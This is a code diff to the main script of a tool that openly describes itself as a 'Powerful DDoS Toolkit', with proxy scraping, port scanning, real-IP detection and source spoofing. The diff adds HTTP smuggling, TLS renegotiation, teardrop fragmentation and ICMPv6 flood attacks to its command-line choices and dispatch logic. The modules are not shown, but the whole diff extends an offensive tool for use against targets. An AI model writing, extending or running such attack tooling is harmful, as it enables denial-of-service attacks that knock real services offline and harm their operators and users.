@@ -18,6 +18,10 @@ from attacks import (
     http2_flood,
     rudy,
     amplification_flood,
+    http_smuggling,
+    tls_renegotiation,
+    ip_fragmentation,
+    icmpv6_flood,
 )
 from core.real_ip import detect_real_ip
 from core.proxy_scraper import scrape_proxies, scrape_user_agents
@@ -79,11 +83,11 @@ def run_port_scan(target):
         pass
 
 def main():
-    parser = argparse.ArgumentParser(description="Powerful DDoS Toolkit with Proxy Scraper, Port Scanner, Bypass Attacks, HTTP/2, RUDY, and Amplification")
+    parser = argparse.ArgumentParser(description="Powerful DDoS Toolkit with Proxy Scraper, Port Scanner, Bypass Attacks, HTTP/2, RUDY, Amplification, Smuggling, TLS Renegotiation, Teardrop, ICMPv6")
     parser.add_argument("--target", help="Target IP or domain")
     parser.add_argument("--port", type=int, default=80, help="Target port")
     parser.add_argument("--method",
-                        choices=["udp", "syn", "http", "slowloris", "dns", "ntp", "memcached", "icmp", "tcp", "bypass", "http2", "rudy", "amp"],
+                        choices=["udp", "syn", "http", "slowloris", "dns", "ntp", "memcached", "icmp", "tcp", "bypass", "http2", "rudy", "amp", "smuggle", "tlsreno", "teardrop", "icmpv6"],
                         help="Attack method")
     parser.add_argument("--threads", type=int, default=100, help="Number of threads")
     parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
@@ -204,6 +208,15 @@ def main():
                                        spoof=args.spoof,
                                        protocol=args.amp_type or "ssdp",
                                        servers=amp_servers)
+        elif args.method == "smuggle":
+            http_smuggling.attack(target, args.port, args.threads, args.duration, args.spoof,
+                                  use_https=args.https)
+        elif args.method == "tlsreno":
+            tls_renegotiation.attack(target, args.port, args.threads, args.duration, args.spoof)
+        elif args.method == "teardrop":
+            ip_fragmentation.attack(target, args.port, args.threads, args.duration, args.spoof)
+        elif args.method == "icmpv6":
+            icmpv6_flood.attack(target, args.port, args.threads, args.duration, args.spoof)
         else:
             method_map[args.method](target, args.port, args.threads, args.duration, args.spoof)
     except KeyboardInterrupt:
